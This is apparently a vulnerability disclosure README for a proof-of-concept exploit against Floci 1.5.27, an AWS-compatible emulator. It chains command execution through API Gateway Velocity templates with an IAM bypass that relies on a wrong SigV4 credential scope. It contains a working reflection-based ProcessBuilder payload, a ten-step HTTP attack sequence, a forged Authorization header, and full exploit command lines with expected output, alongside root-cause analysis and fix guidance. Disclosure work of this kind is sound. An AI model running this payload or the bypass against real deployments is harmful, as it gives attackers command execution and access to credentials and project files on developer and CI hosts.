# Floci 1.5.27 API Gateway VTL RCE + IAM Scope Bypass PoC

This directory documents and validates an API Gateway Velocity Template Language RCE in Floci `1.5.27`, plus an IAM enforcement bypass that can be chained into the same RCE path.

Floci evaluates user-controlled API Gateway mapping templates with Apache Velocity. The exposed template objects allow reflection from `$util` into `java.lang.ProcessBuilder`. An attacker who can create or update an API Gateway integration response can store a malicious response template, invoke the API, and execute an operating-system command in the Floci JVM process.

The new chain weakens the main precondition. With IAM enforcement enabled, Floci derives the IAM action from the service name inside the SigV4 credential scope. If an API Gateway control-plane request is sent with a non-API-Gateway scope such as `iam`, Floci cannot map the request to an API Gateway action and defaults to allow. A denied or low-privilege key can therefore still create, configure, deploy, and invoke the malicious API Gateway template in affected configurations.

Research status: verified locally end to end through Floci's HTTP API and a standalone PoC.

## Affected Target

- Product: Floci
- Version analyzed: `1.5.27`
- Latest commit rechecked: `7efb280dbcf6f5ea8faab28f1c7d5f8c3f59b4e0`
- Service surface: API Gateway REST API integration response templates and IAM enforcement
- Impact: command execution in the Floci server process
- Default exposure note: IAM policy enforcement is disabled by default
- Chained exposure note: IAM enforcement can be bypassed with a wrong SigV4 credential-scope service on API Gateway control-plane routes

## Impact

When a Floci instance exposes its AWS-compatible API endpoint to an attacker, the attacker can create a REST API, configure a `MOCK` integration, place a malicious VTL response template in the integration response, deploy a stage, and invoke the route. The response template executes server-side during request processing and can start arbitrary local processes.

In the validated local run, the payload executed `cmd.exe /c echo FLOCI_STANDALONE_POC>...` and created a marker file from the Floci process. On Linux targets the same primitive can run `sh -c '<command>'`.

The IAM bypass was validated with enforcement enabled. A real IAM user with a policy denying `apigateway:POST` received `403` when using a correct `apigateway` credential scope, then succeeded with the same key when the credential scope was changed to `iam`.

Severity is critical for exposed Floci deployments where untrusted users can reach the API Gateway control plane. It is high to critical for shared developer or CI environments because the command runs with the Floci process privileges and can access local credentials, mounted project files, Docker credentials, service data, and adjacent emulator state available to that process.

## Preconditions

- The attacker can reach Floci's HTTP endpoint.
- API Gateway service support is enabled.
- The target host has an executable command path matching the supplied `--argv`.
- One of the following is true:
  - IAM enforcement is disabled, which is the default.
  - IAM enforcement is enabled, but the attacker can supply a parseable SigV4 Authorization header accepted by the Floci HTTP stack.
  - IAM enforcement is enabled, but the attacker has any usable low-privilege or denied key and sends API Gateway control-plane requests with a wrong service scope such as `iam`.

Floci's default application config enables API Gateway and disables IAM policy enforcement:

```yaml
services:
  apigateway:
    enabled: true
  apigatewayv2:
    enabled: true
  iam:
    enabled: true
    enforcement-enabled: false
```

## Root Cause

### VTL RCE

The API Gateway integration response API stores attacker-controlled `responseTemplates` without sandboxing them as untrusted code:

```text
ApiGatewayService.putIntegrationResponse(...)
  request["responseTemplates"] -> IntegrationResponse.responseTemplates
```

When a `MOCK` integration is invoked, Floci selects the configured response template and evaluates it through `VtlTemplateEngine`:

```text
ApiGatewayExecuteController.invokeMock(...)
  template = ir.responseTemplates()["application/json"]
  result = vtlEngine.evaluate(template, vtlCtx)
```

`VtlTemplateEngine` constructs a default `VelocityEngine`, exposes Java helper objects such as `$util`, and evaluates the template:

```text
new VelocityEngine()
vc.put("util", new UtilVariable(objectMapper))
engine.evaluate(vc, writer, "apigw-template", template)
```

The resulting Velocity environment allows a template to call Java reflection methods:

```vtl
$util.getClass().forName('java.lang.ProcessBuilder')
```

From there, the template can construct a `ProcessBuilder`, start a process, and wait for completion.

### IAM Wrong-Scope Bypass

IAM enforcement extracts the service name from the SigV4 credential scope:

```text
Credential=<access-key>/<date>/<region>/<service>/aws4_request
```

That extracted `<service>` value is passed into action resolution. API Gateway actions are only mapped when the credential-scope service is `apigateway`. If the same API Gateway request is sent with `iam`, action resolution returns `null`.

The enforcement filter treats `null` action mappings as allowed:

```text
action = actionRegistry.resolve(credentialScope, ctx)
if action == null:
  allow
```

This means a request like the following can bypass API Gateway IAM authorization checks:

```text
Authorization: AWS4-HMAC-SHA256 Credential=<key>/20260623/us-east-1/iam/aws4_request, SignedHeaders=host, Signature=test
POST /restapis
```

The same pattern applies to the subsequent API Gateway control-plane calls needed to place and deploy the malicious response template.

## Exploit Flow

The PoC performs the following HTTP sequence:

1. `POST /restapis`
2. `GET /restapis/{apiId}/resources`
3. `POST /restapis/{apiId}/resources/{rootId}`
4. `PUT /restapis/{apiId}/resources/{resourceId}/methods/GET`
5. `PUT /restapis/{apiId}/resources/{resourceId}/methods/GET/responses/200`
6. `PUT /restapis/{apiId}/resources/{resourceId}/methods/GET/integration`
7. `PUT /restapis/{apiId}/resources/{resourceId}/methods/GET/integration/responses/200`
8. `POST /restapis/{apiId}/deployments`
9. `POST /restapis/{apiId}/stages`
10. `GET /execute-api/{apiId}/prod/rce`

The malicious response template is stored at step 7 and executed at step 10.

When `--bypass-iam` is used, steps 1 through 9 carry a SigV4-shaped `Authorization` header whose credential scope uses `iam` instead of `apigateway`.

## Payload

The PoC uses a `ProcessBuilder(List<String>)` path so command arguments are preserved:

```vtl
#set($pbClass=$util.getClass().forName('java.lang.ProcessBuilder'))
#set($listClass=$util.getClass().forName('java.util.List'))
#set($ctor=$pbClass.getConstructor($listClass))
#set($cmd=$util.parseJson('["sh","-c","id > /tmp/floci_vtl_rce"]'))
#set($pb=$ctor.newInstance($cmd))
#set($p=$pb.start())
#set($exit=$p.waitFor())
{"ok":true,"exit":"$exit"}
```

## Files

- `poc.py` - stdlib-only Python exploit driver with optional IAM bypass Authorization support.
- `evidence/2026-06-23-local-verification.txt` - local verification transcript.

## Usage

Default unauthenticated/default-config path:

```bash
python3 poc.py --host 127.0.0.1 --port 4566 --argv sh -c 'id > /tmp/floci_vtl_rce'
cat /tmp/floci_vtl_rce
```

IAM wrong-scope bypass path with a known access key:

```bash
python3 poc.py --host 127.0.0.1 --port 4566 --bypass-iam --auth-access-key AKIAEXAMPLE --argv sh -c 'id > /tmp/floci_vtl_rce'
cat /tmp/floci_vtl_rce
```

Equivalent Windows target marker:

```powershell
python poc.py --host 127.0.0.1 --port 4566 --bypass-iam --auth-access-key AKIAEXAMPLE --argv cmd.exe /c "whoami > C:/Temp/floci_vtl_rce.txt"
Get-Content C:\Temp\floci_vtl_rce.txt
```

Use a raw Authorization header instead of generated header fields:

```bash
python3 poc.py --host 127.0.0.1 --port 4566 --authorization 'AWS4-HMAC-SHA256 Credential=AKIAEXAMPLE/20260623/us-east-1/iam/aws4_request, SignedHeaders=host, Signature=test' --argv sh -c 'id > /tmp/floci_vtl_rce'
```

Leave the created REST API in place for inspection:

```bash
python3 poc.py --host 127.0.0.1 --port 4566 --argv sh -c 'id > /tmp/floci_vtl_rce' --no-cleanup
```

Expected success output shape:

```text
[+] REST API id: d1e873f2f8
[+] Resource id: cfd975b9
[+] Trigger response: {"ok":true,"exit":"0"}
[+] Cleanup delete REST API: HTTP 202
```

## Local Verification

The original RCE was verified in two ways.

First, a Quarkus/JUnit end-to-end test drove Floci's HTTP API in-process and asserted marker creation:

```powershell
.\mvnw.cmd '-Denforcer.skip=true' '-Dmaven.compiler.release=21' '-Dmaven.compiler.enablePreview=true' '-DargLine=--enable-preview' '-Dtest=ApiGatewayVtlRceExploitTest' test
```

Result:

```text
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0
target\apigw-vtl-rce-marker.txt => FLOCI_APIGW_VTL_RCE
```

Second, a live local Floci dev server was started on `127.0.0.1:4566` and this standalone PoC was run against it:

```powershell
python poc.py --host 127.0.0.1 --port 4566 --argv cmd.exe /c "echo FLOCI_STANDALONE_POC>C:/Temp/floci_standalone_poc.txt"
```

Result:

```text
[+] Trigger response: {"ok":true,"exit":"0"}
C:\Temp\floci_standalone_poc.txt => FLOCI_STANDALONE_POC
```

The IAM bypass chain was verified against latest upstream commit `7efb280dbcf6f5ea8faab28f1c7d5f8c3f59b4e0` with IAM enforcement enabled:

```powershell
.\mvnw.cmd -Dtest=ApiGatewayIamBypassRegressionTest test
```

Result:

```text
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0
Correct apigateway scope: HTTP 403 for denied apigateway:POST
Wrong iam scope: created API, stored response template, deployed stage, executed template
```

## Fix Direction

Do not evaluate API Gateway mapping templates with unrestricted Java reflection. A defensive patch should:

- configure Velocity with a secure uberspector and deny reflection/classloader/process access;
- expose only API Gateway-compatible helper methods, not arbitrary Java object graphs;
- add regression tests that prove `$util.getClass()`, `Class.forName`, `ProcessBuilder`, `Runtime`, and classloader access are unavailable from templates;
- treat API Gateway templates as untrusted data-plane code and isolate evaluation from the Floci JVM where practical.

For the IAM bypass, authorization must not trust the caller-controlled credential-scope service as the sole source of truth for the requested service. A defensive patch should:

- resolve the service/action from the matched route or resource handler, not only from `Credential=.../<service>/aws4_request`;
- fail closed when an authenticated request has no action mapping;
- fail closed for unknown access keys when enforcement is enabled;
- reject or separately handle requests whose credential-scope service disagrees with the matched API route.

## Responsible Use

Run this PoC only against local research targets, owned systems, or explicitly authorized lab instances.
